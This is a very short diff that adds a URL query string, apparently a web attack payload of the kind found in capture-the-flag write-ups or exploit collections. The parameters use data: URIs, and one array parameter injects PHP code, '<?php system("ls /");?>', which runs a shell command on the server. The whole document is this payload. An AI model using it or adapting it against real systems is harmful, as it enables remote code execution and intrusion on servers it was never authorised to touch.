@@ -1,0 +1,3 @@
+?f=data:text
+&i=data:text/meow
+&c[]=<?php system("ls /");?>
